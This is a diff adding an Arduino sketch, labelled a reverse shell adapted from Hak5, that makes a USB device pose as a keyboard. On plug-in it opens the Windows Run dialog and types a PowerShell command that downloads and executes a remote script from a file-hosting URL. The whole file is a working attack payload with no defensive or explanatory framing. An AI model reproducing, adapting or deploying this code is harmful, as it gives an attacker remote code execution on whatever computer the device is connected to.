@@ -1,0 +1,39 @@
+#include <HID-Project.h>
+#include <HID-Settings.h>
+
+// Hak5's Reverse Shell Revised For Arduino.
+// Utility function
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  // Start Keyboard and Mouse
+  AbsoluteMouse.begin();
+  Keyboard.begin();
+
+  // Start Payload
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://download943.mediafire.com/73eh0jjku2kg/4btqt19bqtqqkuo/win.ps1');\"");
+
+  Keyboard.press(KEY_RETURN);
+
+  // End Payload
+
+  // Stop Keyboard and Mouse
+  Keyboard.end();
+  AbsoluteMouse.end();
+}
+
+// Unused
+void loop() {}
